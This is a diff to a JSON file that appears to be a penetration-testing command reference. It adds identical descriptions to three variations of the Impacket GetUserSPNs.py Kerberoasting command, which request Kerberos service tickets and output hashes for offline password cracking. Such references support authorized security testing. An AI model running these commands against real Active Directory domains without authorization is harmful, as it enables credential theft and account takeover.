@@ -175,15 +175,18 @@
   "variations": [
     {
       "label": "Authenticate with a password",
-      "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>"
+      "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password>",
+      "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
     },
     {
       "label": "Pass-the-ticket (Kerberos)",
-      "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user>"
+      "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user>",
+      "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
     },
     {
       "label": "Cross-domain",
-      "command": "GetUserSPNs.py -target-domain <foreign_domain> -dc-ip <dc_ip> <domain>/<user>"
+      "command": "GetUserSPNs.py -target-domain <foreign_domain> -dc-ip <dc_ip> <domain>/<user>",
+      "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
     }
   ],
   "steps": [
